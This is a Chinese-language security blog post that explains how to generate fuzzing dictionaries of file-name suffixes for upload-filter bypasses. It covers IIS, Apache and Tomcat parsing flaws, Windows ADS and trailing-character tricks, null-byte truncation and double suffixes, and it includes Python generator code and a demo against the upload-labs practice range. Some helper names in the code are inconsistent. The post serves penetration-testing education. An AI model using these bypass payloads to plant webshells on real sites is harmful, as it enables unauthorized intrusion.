

 [编程开发](https://gv7.me/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/)

  [fuzz](https://gv7.me/tags/fuzz/)

上传漏洞的利用姿势很多，同时也会因为语言，中间件，操作系统的不同，利用也不同。比如有：`大小写混合`，`.htaccess`,`解析漏洞`，`00截断`，`.绕过`，`空格绕过`，`::$DATA绕过`，以及多种姿势的组合等等。当遇到一个上传点，如何全面的利用以上姿势测试一遍，并快速发现可以成功上传webshell的姿势？

**方案一:一个一个手工测试**

手工把所有姿势测试一遍，先不说花费大量时间，还很可能会遗漏掉某些姿势而导致无法利用成功。

**方案二:fuzz**

在fuzz时我们往往会给一个输入点喂入大量特殊的数据。这个特殊的数据可能随机的，毫无规律的，甚至我们都无法预知的。但我思考了一下，这样的fuzz方式只是适合在本地fuzz 0day漏洞，并不适合通过fuzz在线网站的上传点，快速找出可以成功上传webshell的payload，因为时间成本排在哪里。

通过思考，我们可以知道如果能根据上传漏洞的场景（后端语言，中间件，操作系统）来生成优质的fuzz字典，然后使用该字典进行fuzz，就能消除以上两个解决方案的弊端！

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%B8%80%E3%80%81%E6%9E%84%E6%83%B3 "一、构想")一、构想

在动手之前我们来思考下上传漏洞跟那些因素有关：

**一、可解析的后缀，也就是该语言有多个可解析的后缀，比如php语言可解析的后缀为php,php2,php3等等**

**二、大小写混合，如果系统过滤不严，可能大小写可以绕过。**

**三、中间件，每款中间件基本都解析漏洞,比如iis就可以把xxx.asp;.jpg当asp来执行。**

**四、系统特性，特别是Windows的后缀加点（.）,加空格，加::$DATA可以绕过目标系统。**

**五、语言漏洞，流行的三种脚本语言基本都存在00截断漏洞。**

**六、双后缀，这个与系统和中间件无关，偶尔会存在于代码逻辑之中。**

整理以上思考，我们把生成字典的规则梳理为以下几条

1. 可解析的后缀+大小写混合
2. 可解析的后缀+大小写混合+中间件漏洞
3. .htaccess + 大小写混合
4. 可解析的后缀+大小写混合+系统特性
5. 可解析的后缀+大小写混合+语言漏洞
6. 可解析的后缀+大小写混合+双后缀

下面我们根据上面的构想，来分析每一方面的细节，并使用代码来实现。

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%BA%8C%E3%80%81%E5%8F%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E7%BC%80 "二、可解析后缀")二、可解析后缀

其实很多语言都这样，有多个可以解析后缀。当目标站点采用黑名单时，往往包含不全。以下我收集相对比较全面的可解析后缀，为后面生成字典做材料。

|语言|可解析后缀|
|:--|:--|
|asp/aspx|asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr|
|php|php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml|
|jsp|jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%B8%89%E3%80%81%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88 "三、大小写混合")三、大小写混合

有些网站过滤比较简单，只是过滤了脚本后缀，但是没有对后缀进行统一转换为小写，在进行判断。这就纯在一个大小写问题。这里我们可以编写两个函数，一个函数是传入一个字符串，函数返回该字符串所有大小写组合的可能，第二个函数是基于第一个函数，把一个list的传入返回一个list内所有字符的所有大小写组合的可能。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9  <br>10  <br>11  <br>12  <br>13  <br>14  <br>15  <br>16  <br>17  <br>18  <br>19  <br>20  <br>21  <br>22  <br>23  <br>24  <br>25  <br>26  <br>27  <br>28  <br>29  <br>30  <br>31|## 字符串大小写混合，返回字符串所有大写可能  <br>def str_case_mixing(word):  <br>	str_list = []  <br>	word = word.lower()  <br>	tempWord = copy.deepcopy(word)  <br>	plist = []  <br>	redict = {}  <br>	for char in range( len( tempWord ) ):  <br>		char = word[char]  <br>		plist.append(char)   <br>	num = len( plist )  <br>	for i in range( num ):  <br>		for j in range( i , num + 1 ):  <br>			sContent = ''.join( plist[0:i] )  <br>			mContent = ''.join( plist[i:j] )  <br>			mContent = mContent.upper()  <br>			eContent = ''.join( plist[j:] )  <br>			content = '''%s%s%s''' % (sContent,mContent,eContent)  <br>			redict[content] = None  <br>  <br>	for i in redict.keys():  <br>		str_list.append(i)  <br>  <br>	return str_list  <br>	  <br>## list大小写混合  <br>def list_case_mixing(li):  <br>	res = []  <br>	for l in li:  <br>		res += uperTest(l)  <br>	return res|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E5%9B%9B%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E "四、中间件的漏洞")四、中间件的漏洞

这块是比较复杂的一块。首先我们先来梳理下

### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#4-1-iis "4.1 iis")4.1 iis

iis一共有三个解析漏洞：

1.IIS6.0文件解析 xx.asp;.jpg  
2.IIS6.0目录解析 xx.asp/1.jpg  
3.IIS 7.0畸形解析 xxx.jpg/x.asp

由于2和3和上传的文件名无关，故我们只根据1来生成fuzz字典

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6|def iis_suffix_creater(suffix):  <br>	res = []  <br>	for l in suffix:  <br>		str ='%s;.%s' % (l,allow_suffix)  <br>		res.append(str)  <br>	return res|

### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#4-2-apache "4.2 apache")4.2 apache

apache相关的解析漏洞有两个：

1. %0a(CVE-2017-15715)
2. 未知后缀 test.php.xxx

根据以上构造`apache_suffix_builder`函数生成规则

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8|def apache_suffix_creater(suffix):  <br>	res = []  <br>	for l in suffix:  <br>		str = '%s.xxx' % l  <br>		res.append(str)  <br>		str = '%s%s' % (l,urllib.unquote('%0a')) #CVE-2017-15715  <br>		res.append(str)  <br>	return res|

### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#4-3-nginx "4.3 nginx")4.3 nginx

nginx解析漏洞有三个：

1. 访问连接加/xxx.php test.jpg/xxx.php
2. 畸形解析漏洞 test.jpg%00xxx.php
3. CVE-2013-4547 test.jpg(非编码空格)\0x.php

nginx的解析漏洞，由于和上传的文件名无关，故生成字典无需考虑。

### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#4-4-tomcat "4.4 tomcat")4.4 tomcat

tomcat用于上传绕过的有三种,不过限制在windows操作系统下。

1. xxx.jsp/
2. xxx.jsp%20
3. xxx.jsp::$DATA

根据以上规则生成字典对应的代码为：

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8|win_tomcat = ['%20','::$DATA','/']  <br>def tomcat_suffix_creater(suffix):  <br>	res = []  <br>	for l in suffix:  <br>		for t in win_tomcat:  <br>			str = '%s%s' % (l,t)  <br>			res.append(str)  <br>	return res|

如果确定中间件为apache,可以加入.htaccess。同时如果操作系统还为windows，我们可以大小写混合。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6|if (middleware == 'apache' or middleware == 'all') and (os == 'win' or os == 'all'):  <br>	htaccess_suffix = uperTest(".htaccess")  <br>elif (middleware == 'apache' or middleware == 'all') and os == 'linux':  <br>	htaccess_suffix = ['.htaccess']  <br>else:  <br>	htaccess_suffix = []|

### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#4-5-%E8%AF%AD%E8%A8%80%EF%BC%8C%E4%B8%AD%E9%97%B4%E4%BB%B6%E4%B8%8E%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%85%B3%E7%B3%BB "4.5 语言，中间件与操作系统的关系")4.5 语言，中间件与操作系统的关系

以上我们根据每个中间件的漏洞，编写了对应的fuzz字典生成函数。在最终生成字典时，我们还要考虑中间件可以运行那些语言，以及它们与平台的关系。

|语言|IIS|Apache|Tomcat|Window|Linux|
|:--|:-:|:-:|:-:|:-:|:-:|
|asp/aspx|√|√|×|√|√|
|php|√|√|√|√|√|
|jsp|√|×|√|√|√|

根据上表，我们明白

- iis下可以运行asp/aspx,php,jsp脚本，故这3种脚本语言可解析后缀均应该传入iis_suffix_builder()进行处理
- apache下可以运行asp/aspx,php。故这2两种脚本语言可解析后缀均应该传入apache_suffix_builder()进行处理
- tomcat下可以运行php，jsp，故这两个脚本语言可解析后缀均应该传入tomcat_suffix_builder()进行处理。
- 注意：根据对tomcat上传的绕过分析，发现之后在windows平台下才能成功。故之后在Windows平台下才会调用`tomcat_suffix_builder()`对可解析后缀进行处理。

故伪代码可以编写如下：

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9  <br>10  <br>11  <br>12  <br>13  <br>14  <br>15  <br>16  <br>17  <br>18  <br>19|if middleware == 'iis':  <br>	case_asp_php_jsp_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_jsp_parse_suffix  <br>	middleware_parse_suffix = iis_suffix_creater(case_asp_php_jsp_parse_suffix)  <br>elif middleware == 'apache':  <br>	case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix  <br>	middleware_parse_suffix = apache_suffix_creater(case_asp_php_html_parse_suffix)  <br>elif middleware == 'tomcat' and os == 'linux':  <br>	middleware_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix  <br>elif middleware == 'tomcat' and (os == 'win' or os == 'all'):  <br>	case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix  <br>	middleware_parse_suffix = tomcat_suffix_creater(case_php_jsp_parse_suffix)  <br>else:  <br>	case_asp_php_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix  <br>	iis_parse_suffix = iis_suffix_creater(case_asp_php_parse_suffix)  <br>	case_asp_php_html_parse_suffix = case_asp_parse_suffix + case_php_parse_suffix + case_html_parse_suffix  <br>	apache_parse_suffix = apache_build(case_asp_php_html_parse_suffix)  <br>	case_php_jsp_parse_suffix = case_php_parse_suffix + case_jsp_parse_suffix  <br>	tomcat_parse_suffix = tomcat_build(case_php_jsp_parse_suffix)		  <br>	middleware_parse_suffix = iis_parse_suffix + apache_parse_suffix + tomcat_parse_suffix|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%BA%94%E3%80%81%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7 "五、系统特性")五、系统特性

经过查资料，目前发现在系统层面，有以下特性可以被上传漏洞所利用。

- Windows下文件名不区分大小写，Linux下文件名区分大写欧西
- Windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php
- Windows下文件名结尾加入`.`,`空格`,`<`,·`>`,`>>>`,`0x81-0xff`等字符，最终生成的文件均被windows忽略。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9  <br>10  <br>11  <br>12  <br>13  <br>14  <br>15  <br>16  <br>17  <br>18|# 生成0x81-0xff的字符list  <br>def str_81_to_ff():  <br>	res = []  <br>	for i in range(129,256):  <br>		str = '%x' % i  <br>		str = '%' + str  <br>		str = urllib.unquote(str)  <br>		res.append(str)  <br>	return res  <br>  <br>windows_os = [' ','.','/','::$DATA','<','>','>>>','%20','%00'] + str_81_to_ff()  <br>def windows_suffix_builder(suffix):  <br>	res = []  <br>	for s in suffix:  <br>		for w in windows_os:  <br>			str = '%s%s' % (s,w)  <br>			res.append(str)  <br>	return res|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E5%85%AD%E3%80%81%E8%AF%AD%E8%A8%80%E7%9A%84%E6%BC%8F%E6%B4%9E "六、语言的漏洞")六、语言的漏洞

语言漏洞被利用于上传的有%00截断和0x00截断。它们在asp，php和jsp中都存在着。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8|def str_00_truncation(suffix,allow_suffix):  <br>	res = []  <br>	for i in suffix:  <br>		str = '%s%s.%s' % (i,'%00',allow_suffix)  <br>		res.append(str)  <br>		str = '%s%s.%s' % (i,urllib.unquote('%00'),allow_suffix)  <br>		res.append(str)  <br>	return res|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%B8%83%E3%80%81%E5%8F%8C%E5%90%8E%E7%BC%80 "七、双后缀")七、双后缀

有些站点通过对上传文件名进行删除敏感字符（php,asp,jsp等等）的方式进行过滤,例如你上传一个aphp.jpg的文件，那么上传之后就变成了a.jpg。这时就可以利用双后缀的方式上传一个a.pphphp,最终正好生成a.php。其实双后缀与中间件和操作系统无关，而是和代码逻辑有关。

针对双后缀，我们可以写个`str_double_suffix_creater(suffix)`函数，传入后缀名suffix即可生成所有的双后缀可能。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7|def str_double_suffix_creater(suffix):  <br>	res = []  <br>	for i in range(1,len(suffix)):  <br>		str = list(suffix)  <br>		str.insert(i,suffix)  <br>		res.append("".join(str))  <br>	return res|

在`list_double_suffix_creater(suffix)`函数基础上，  
可以编写`list_double_suffix_creater(list_suffix)`来为一个list生成所有双后缀可能。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5|def list_double_suffix_creater(list_suffix):  <br>	res = []  <br>	for l in list_suffix:  <br>		res += double_suffix_creater(l)  <br>	return duplicate_removal(res)|

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E5%85%AB%E3%80%81%E6%95%B4%E5%90%88%E4%BB%A3%E7%A0%81 "八、整合代码")八、整合代码

上面我们针对和上传漏洞相关的每个方面进行了细致的分析，也提供了相关的核心代码。最终整合后的代码限于边幅，就放在github上了。

**github：[https://github.com/c0ny1/upload-fuzz-dic-builder](https://github.com/c0ny1/upload-fuzz-dic-builder)**

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7  <br>8  <br>9  <br>10  <br>11  <br>12  <br>13|$ python upload-fuzz-dic-builder.py -h  <br>usage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]  <br>  <br>optional arguments:  <br>  -h, --help            show this help message and exit  <br>  -n , --upload-filename  <br>                        Upload file name  <br>  -a , --allow-suffix   Allowable upload suffix  <br>  -l , --language       Uploaded script language  <br>  -m , --middleware     Middleware used in Web System  <br>  --os                  Target operating system type  <br>  -d, --double-suffix   Is it possible to generate double suffix?  <br>  -o , --output         Output file|

脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（–os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。

## [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#%E4%B9%9D%E3%80%81%E6%A1%88%E4%BE%8B "九、案例")九、案例

[upload-labs](https://github.com/c0ny1/upload-labs)靶场的Pass0-3到Pass-10其实都是关于后缀的，在不知道代码的情况下，我们如何快速发现可以绕过的后缀呢？这时我们就可以使用`upload-fuzz-dic-builder.py`脚本生成fuzz字典，来进行fuzz。这里我选择Pass-09来给大家演示。

#### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#1-%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%94%9F%E6%88%90fuzz%E5%AD%97%E5%85%B8%E3%80%82 "1.利用脚本生成fuzz字典。")1.利用脚本生成fuzz字典。

由于知道我们的后端语言为`php`,中间件为`apache`，操作系统为`Windows`。所以可以利用这些信息生成更精确的fuzz字典。

|   |   |
|---|---|
|1  <br>2  <br>3  <br>4  <br>5  <br>6  <br>7|$ python upload-fuzz-dic-builder.py -l php -m apache --os win  <br>[+] 收集17条可解析后缀完毕！  <br>[+] 加入145条可解析后缀大小写混合完毕！  <br>[+] 加入152条中间件漏洞完毕！  <br>[+] 加入37条.htaccess完毕！  <br>[+] 加入10336条系统特性完毕！  <br>[+] 去重后共10753条数据写入upload_fuzz_dic.txt文件|

[![图1-生成的字典](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/upload_fuzz_dic.png)](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/upload_fuzz_dic.png)图1-生成的字典

#### [](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/#2-%E6%8A%93%E5%8C%85%E4%BD%BF%E7%94%A8burp%E7%9A%84Intruder%E6%A8%A1%E5%9D%97%E5%AF%B9%E4%B8%8A%E4%BC%A0%E5%90%8D%E7%A7%B0%E8%BF%9B%E8%A1%8Cfuzz "2.抓包使用burp的Intruder模块对上传名称进行fuzz")2.抓包使用burp的Intruder模块对上传名称进行fuzz

抓取upload-labs的Pass-09的上传包，发送到Intruder模块，加载第一步脚本生成的fuzz字典，对上传的包的文件名进行fuzz。

[![图2-fuzz结果](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/fuzz_result.png)](https://gv7.me/articles/2018/make-upload-vul-fuzz-dic/fuzz_result.png)图2-fuzz结果

经过测试，通过fuzz可以快速找到可以突破upload-labs那些基于后缀的Pass的payload。甚至fuzz出同一个Pass多种绕过的方法。